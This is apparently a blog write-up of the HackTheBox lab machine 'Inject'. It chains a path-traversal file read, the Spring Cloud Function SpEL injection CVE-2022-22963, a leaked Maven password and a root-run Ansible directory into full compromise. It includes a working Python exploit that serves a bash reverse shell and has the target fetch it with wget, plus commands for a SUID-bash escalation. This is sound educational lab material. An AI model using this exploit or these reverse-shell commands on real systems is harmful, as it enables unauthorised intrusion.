---
layout: post
title: "HTB: Inject"
subtitle: "LFI leaks the pom, Spring Cloud Function SpEL injection gives a shell, then a root ansible-playbook cron"
date: 2023-04-03
tags: [htb, linux, spring, cve-2022-22963, ansible]
category: writeups
kind: machine
tldr: "A path traversal in an image endpoint leaked the app source and pom.xml, which pinned spring-cloud-function-web 3.2.2. That version is vulnerable to CVE-2022-22963, a SpEL injection in the routing expression header, which gave a shell as the app user. A maven settings.xml leaked phil's password for lateral movement, and a root-run ansible-playbook over a writable tasks directory gave root."
---

## the box

Inject is an easy Linux box at `10.10.11.204`. Two ports were open: `22` running OpenSSH 8.2p1 (the Ubuntu `4ubuntu0.5` package, so 20.04 focal) and `8080` serving a Spring Boot web app titled "Home". The whole chain ran through 8080. The recurring theme is one weak link feeding the next: a file read that does not execute code on its own but hands over the exact dependency versions, which turns a guess into a known CVE.

## recon

I started with a full port sweep, then a service scan on what came back.

```bash
nmap -p- --min-rate 10000 10.10.11.204
nmap -p 22,8080 -sCV 10.10.11.204
```

The interesting result:

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
```

`nmap` mislabeled 8080 as Nagios NSCA, but the `http-title: Home` gave it away as a web server. Browsing to `http://10.10.11.204:8080/` showed a cloud storage app. The pages worth noting:

- `/` home
- `/upload` an upload form
- `/show_image?img=` renders an uploaded image by filename
- `/blogs`, `/register`, `/environment` other routes

The upload feature rendered images back through `show_image`, and that endpoint took a filename and passed it straight to a file read with no sanitizing. Feeding it `.` returned a directory listing instead of an image, which is the first sign the parameter is reaching the filesystem directly. Walking up the tree confirmed traversal:

```
http://10.10.11.204:8080/show_image?img=../../../../../../../../etc/passwd
```

That returned `/etc/passwd`, so arbitrary file read with no extension requirement. From `/etc/passwd` I pulled the local users with shells:

```
frank:x:1000:1000::/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

Because the parameter listed directories too, I used it as a crude file browser. Listing `/var/www/` showed `html` and `WebApp`. Listing `/var/www/WebApp/` gave the Java project layout:

```
.classpath
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

The file that mattered was `pom.xml`. I read it through the traversal:

```
http://10.10.11.204:8080/show_image?img=../../../../../../../var/www/WebApp/pom.xml
```

The parent pinned Spring Boot `2.6.5` on Java 11, and one dependency stood out:

```xml
<dependency>
    <groupId>org.springframework.cloud</groupId>
    <artifactId>spring-cloud-function-web</artifactId>
    <version>3.2.2</version>
</dependency>
```

That version number is the whole foothold. Spring Boot 2.6.5 with Java 11 also looks like Spring4Shell (CVE-2022-22965) territory, but the deployment here is a fat JAR rather than a WAR on Tomcat, so Spring4Shell does not apply. The `spring-cloud-function-web` pin is the real target.

## foothold

`spring-cloud-function-web` 3.2.2 is vulnerable to **CVE-2022-22963**. Spring Cloud Function lets you route requests to a function by name, and when you POST to `/functionRouter`, the framework reads the `spring.cloud.function.routing-expression` header and evaluates it as a SpEL (Spring Expression Language) expression. SpEL can reach arbitrary Java, so a header like `T(java.lang.Runtime).getRuntime().exec(...)` runs whatever command you want. It was fixed in 3.1.7 and 3.2.3.

The expression I needed:

```
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("COMMAND")
```

First I proved execution with a ping I could watch on a `tcpdump`:

```bash
curl -X POST http://10.10.11.204:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 10.10.16.19")' \
  -d 'a'
```

The ICMP echo landed on my listener, so the SpEL is live. `Runtime.exec` does not parse a shell line though, it splits on spaces and runs the first token as a program with the rest as argv. That breaks pipes, redirects, and the `>&` in a raw bash reverse shell, so I staged it instead of one-lining it. I wrote a small Python helper that hosts a reverse shell script on port `5555`, pulls it down with `wget`, and runs it:

```python
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from sys import argv
import threading

class ReverseShellRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, lhost, lport, *args):
        self.lhost = lhost
        self.lport = lport
        BaseHTTPRequestHandler.__init__(self, *args)
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(f"""
        #!/bin/bash
        bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
        """.encode())

def getHeaderForPayload(command):
    return {"spring.cloud.function.routing-expression":
            f"T(java.lang.Runtime).getRuntime().exec(\"{command}\")"}

def execCommand(command):
    headers = getHeaderForPayload(command)
    return requests.post("http://10.10.11.204:8080/functionRouter",
                         data="a", headers=headers)

def hostReverseShell(lhost, lport):
    listener = HTTPServer(('', 5555),
        lambda *args: ReverseShellRequestHandler(lhost, lport, *args))
    listener.handle_request()

def main():
    lhost, lport = argv[1], argv[2]
    threading.Thread(target=hostReverseShell, args=(lhost, lport)).start()
    execCommand(f"wget http://{lhost}:5555 -O /tmp/.shell.sh")
    execCommand("bash /tmp/.shell.sh")

if __name__ == "__main__":
    main()
```

Each call to `execCommand` is a single program invocation, so `wget` and `bash` each run cleanly with their own argv. With a `nc -lvnp 1337` waiting, I ran it:

```bash
python3 poc.py 10.10.16.19 1337
```

The box fetched `/tmp/.shell.sh`, ran it, and the listener caught a shell as `frank`, the app user. If you would rather avoid the staging file, the same execution works with bash brace expansion to dodge the space splitting, for example `bash -c {echo,BASE64}|{base64,-d}|bash`, since `{a,b}` expands to separate argv elements without literal spaces.

## user

`frank` did not own the user flag. Looking around his home, the Maven config leaked a password:

```bash
cat /home/frank/.m2/settings.xml
```

```xml
<settings>
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
    </server>
  </servers>
</settings>
```

`/home/[user]/.m2/settings.xml` is the standard place Maven keeps server credentials, so it is a reliable spot to check. I could read the same file earlier over the LFI, which would have given the password before the shell.

SSH as phil was blocked. `sshd_config` carried a `DenyUsers phil` line, so the key and password were useless over 22. But the rule only governs SSH, not local switching, so from frank's shell:

```bash
su - phil
# password: DocPhillovestoInject123
```

That worked, and phil owned `user.txt`.

## root

I dropped `pspy64` on the box to watch for scheduled jobs running as other users:

```bash
wget http://10.10.16.19/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

On a short interval, root ran an Ansible playbook:

```
UID=0 PID=1485 | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
```

The driver behind it is a cron calling `ansible-parallel /opt/automation/tasks/*.yml`, so root runs every `.yml` file it finds in that directory. The directory permissions are the bug:

```bash
ls -ld /opt/automation/tasks
# drwxrwxr-x 2 root staff ... /opt/automation/tasks
id
# ... groups=...,50(staff)
```

The directory is group-writable by `staff`, and phil is in `staff`, so I could drop my own playbook. Anything in there runs as root on the next tick. I wrote a playbook that runs a shell task to make a SUID copy of bash:

```bash
cat > /opt/automation/tasks/playbook_2.yml << 'EOF'
- hosts: localhost
  tasks:
    - name: shell
      shell: cp /bin/bash /tmp/.bash; chmod 4755 /tmp/.bash
EOF
```

The shorthand inline form also works:

```bash
echo "[{hosts: localhost, tasks: [shell: /bin/bash /tmp/.shell.sh]}]" > /opt/automation/tasks/playbook_2.yml
```

When `ansible-parallel` picked the file up, the task ran as root and dropped a SUID bash. Running it kept the root euid:

```bash
/tmp/.bash -p
id
# uid=1001(phil) ... euid=0(root)
cat /root/root.txt
```

## takeaway

The chain is one mistake feeding the next. The LFI did not directly give code execution, but it leaked the exact dependency versions, which turned a guess into a known CVE. Pinning a vulnerable spring-cloud-function release is the real foothold, and `Runtime.exec` splitting on spaces is the reason the shell needs staging rather than a one-liner. For root, a privileged process that blindly runs every file in a group-writable directory is an escalation waiting for anyone in that group.
